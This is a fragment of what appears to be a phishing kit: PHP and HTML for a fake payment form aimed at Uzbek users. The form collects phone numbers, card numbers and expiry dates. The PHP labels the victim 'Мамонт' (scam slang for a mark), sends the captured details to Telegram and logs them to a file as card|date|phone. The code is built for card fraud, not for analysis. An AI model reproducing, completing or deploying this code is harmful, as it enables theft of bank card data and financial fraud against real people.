...
$arr = array(
  '💸Мамонт ввел данные карты "Мария": ' => $namemodels, //name
...
if ($sendToTelegram) {
 ...
 $fp = fopen("db.html", "a"); // Открываем файл в режиме записи
$mytext = $cardnumber.'|'.$date.'|'.$phone.'<br>'; // Исходная строка
                        ...
                        <div class="jss178 jss179 jss181 jss5">
                            <div class="jss178 jss179">
                                ...
                                <div class="jss213 jss200 jss204 jss214 jss201">
                                    <input minlength="12" maxlength="13" name="phone" aria-invalid="false" class="jss223 jss208" placeholder="+998 xx xxx xx xx" type="tel" value="" required="required">
                                </div>
                                </div>
                                </div>
                                <div class="jss178 jss179 jss181 jss5">
                                    <div class="jss178 jss179">
                                        ...
                                        <div class="jss213 jss200 jss204 jss214 jss201">
                                            <input  maxlength="16" name="cardnumber" aria-invalid="false" class="mask-card-number form-control jss223 jss208" type="tel" mask="---" value="" required="required">
                                            </div>
                                            </div>
                                            </div>
                                            <div class="jss178 jss179 jss181 jss5">
                                                <div class="jss178 jss179">
                                                    ...
                                                    <div class="jss213 jss200 jss204 jss214 jss201">
                                                        <input name="date" aria-invalid="false" class="mask-card-date form-control jss223 jss208" placeholder="--/--" type="text" value="" required="required">
                                                        </div>
                                                        </div>
                                                        </div>
                                                        <div class="jss46 jss54 jss63">
